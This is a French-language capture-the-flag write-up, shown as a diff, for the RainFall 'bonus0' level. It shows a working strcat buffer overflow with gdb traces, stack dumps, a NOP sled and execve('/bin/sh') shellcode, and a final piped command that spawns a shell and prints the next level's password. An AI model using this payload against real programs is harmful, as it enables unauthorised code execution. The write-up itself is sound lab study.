@@ -1,0 +1,125 @@
+------> On va exploiter le strcat de la fonction <pp>.
+------> On check avec gdb:
+$ gdb ./bonus0
+(gdb) r
+Starting program: /home/user/bonus0/bonus0
+ -
+AAAAAAAAAAaaaaaaaaaa
+ -
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+AAAAAAAAAAaaaaaaaaaaABCDEFGHIJKLMNOPQRST�� ABCDEFGHIJKLMNOPQRST��
+
+Program received signal SIGSEGV, Segmentation fault.
+0x4d4c4b4a in ?? ()
+
+------> On ecrit dabord 20 octets puis le segfault se situe aux lettres 'JKLM' soit au 10eme octets apres.
+------> 29 octets + addresse.
+------> Apres plusieurs test on arrive a executer un shell comme suit:
+(gdb) b *0x080485ca 		 (<+38>:	 leave (fonction <main>))
+(gdb) r
+Starting program: /home/user/bonus0/bonus0
+ -
+python -c 'print "A"*20'
+ -
+python -c 'print "A"+"\xbf\xff\xe6\x90"[::-1]*3+"\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'
+AAAAAAAAAAAAAAAAAAAAA������������������� A�������������������
+
+Breakpoint 1, 0x080485ca in main ()
+
+-------> Alors un peu d'explication sur la 2eme ligne:
+-------> Tout d'abord j'ecris "AAAAA" pour aligner les adresses sur la stack et pour plus tard les assigner a esp et ebp.
+-------> Ensuite j'envois deux fois l'adresse 0xbfffe690, pourquoi ? tout simplement car l'instruction
+-------> 'leave' du <main> va push $ebx, du coup mettre 0xbfffe690 dans le base pointeur et avancer sur
+-------> esp sur 0xbfffe690.
+-------> Mais a quoi correspond cette adresse ? C'est l'adresse du buffer de 4096 dans <p> auquel on a ajouter 0x10
+-------> pour simplement tomber dans les NOP sleds et non pas a "A\xbf\xff\x06\x90\xbf\xff\x06\x90...".
+-------> Et voila, le reste correspond aux NOP sleds et au shellcode [excve("/bin/sh", NULL, NULL)].
+-------> Regardons la stack pour verifier mes dires:
+
+(gdb) echo 'x/40x $esp'
+0xbffff6f0:		   0xbffff706	0x080498d8	0x00000001	0x0804835d
+0xbffff700:		   0xb7fd13e4	0x4141000d	0x41414141	0x41414141
+0xbffff710:		   0x41414141	0x41414141	0x90414141	0x90bfffe6
+0xbffff720:		   0x90bfffe6	0x90bfffe6	0x90909090	0x0ff49090
+0xbffff730:		   0x4120b7fd	0xbfffe690	0xbfffe690	0xbfffe690
+0xbffff740:		   0x90909090	0xf4909090	0x00b7fd0f	0xb7fdc858
+0xbffff750:		   0x00000000	0xbffff71c	0xbffff7dc	0x00000000
+0xbffff760:		   0x0804824c	0xb7fd0ff4	0x00000000	0x00000000
+0xbffff770:		   0x00000000	0xc98df794	0xfeca5384	0x00000000
+0xbffff780:		   0x00000000	0x00000000	0x00000001	0x08048400
+(gdb) echo 'x/40x $ebp'
+0xbffff738:		   0xbfffe690	0xbfffe690	0x90909090	0xf4909090
+0xbffff748:		   0x00b7fd0f	0xb7fdc858	0x00000000	0xbffff71c
+0xbffff758:		   0xbffff7dc	0x00000000	0x0804824c	0xb7fd0ff4
+0xbffff768:		   0x00000000	0x00000000	0x00000000	0xc98df794
+0xbffff778:		   0xfeca5384	0x00000000	0x00000000	0x00000000
+0xbffff788:		   0x00000001	0x08048400	0x00000000	0xb7ff26b0
+0xbffff798:		   0xb7e453e9	0xb7ffeff4	0x00000001	0x08048400
+0xbffff7a8:		   0x00000000	0x08048421	0x080485a4	0x00000001
+0xbffff7b8:		   0xbffff7d4	0x080485d0	0x08048640	0xb7fed280
+0xbffff7c8:		   0xbffff7cc	0xb7fff918	0x00000001	0xbffff8f8
+
+---------> Maintenant on avance en executant l'instruction leave:
+
+(gdb) echo stepi
+bonus0@RainFall:~$ 0x080485cb in main ()
+(gdb) echo 'x/40x $esp'
+bonus0@RainFall:~$ 0xbffff73c:	0xbfffe690	0x90909090	0xf4909090	0x00b7fd0f
+0xbffff74c:		   0xb7fdc858	0x00000000	0xbffff71c	0xbffff7dc
+0xbffff75c:		   0x00000000	0x0804824c	0xb7fd0ff4	0x00000000
+0xbffff76c:		   0x00000000	0x00000000	0xc98df794	0xfeca5384
+0xbffff77c:		   0x00000000	0x00000000	0x00000000	0x00000001
+0xbffff78c:		   0x08048400	0x00000000	0xb7ff26b0	0xb7e453e9
+0xbffff79c:		   0xb7ffeff4	0x00000001	0x08048400	0x00000000
+0xbffff7ac:		   0x08048421	0x080485a4	0x00000001	0xbffff7d4
+0xbffff7bc:		   0x080485d0	0x08048640	0xb7fed280	0xbffff7cc
+0xbffff7cc:		   0xb7fff918	0x00000001	0xbffff8f8	0x00000000
+(gdb) echo 'x/40x $ebp'
+bonus0@RainFall:~$ 0xbfffe690:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffe6a0:		   0x50c03190	0x732f2f68	0x622f6868	0xe3896e69
+0xbfffe6b0:		   0x53e28950	0x0bb0e189	0x000080cd	0x00000000
+0xbfffe6c0:		   0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6d0:		   0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6e0:		   0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6f0:		   0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe700:		   0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe710:		   0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe720:		   0x00000000	0x00000000	0x00000000	0x00000000
+
+--------> On est bien a l'adresse de notre buffer.
+(gdb) echo c
+Continuing.
+bonus0@RainFall:~$ process 8309 is executing new program: /bin/dash
+exit
+
+---------> Reste plus qu'a envoyer ca hors gdb:
+
+
+python -c 'print "A"*20'
+python -c 'print "A"+"\xbf\xff\xe6\x90"[::-1]*3+"\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'
+
+ca marche pas.....
+
+J'augmente l'addresse pour securiser le fait de tomber dans les nop sleds.
+Je change aussi la facon d'ecrire ma ligne de commande.
+
+J'ecris mes 20 "A" qui ne serviront de toutes facon a rien (j'aurais tout aussi bien pu ecrire des "\x90"),
+je mets un nop sleds enorme histoire de securiser l'addresse de retour et pouvoir tomber dedans,
+mon shellcode ET un "\n" sinon python ne l'ecris pas et du coup le premier read ne return pas.
+
+Ensuite, j'ecris 1 seul "B" pour aligner mes bytes,
+trois fois l'adresses pour etre secure,
+et septs "C" pour remplir str2.
+
+Je fais ensuite un cat pour ne pas fermer le shell.
+
+Je pipe tout ca dans ./bonus0:
+
+(python -c 'print "A"*20 + "\x90"*500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\n"' ; python -c 'print "B"+"\xbf\xff\xe6\xc0"[::-1]*3+"C"*7+"\n"' ; cat) | ./bonus0
+ls
+ls: cannot open directory .: Permission denied
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+
+tada....
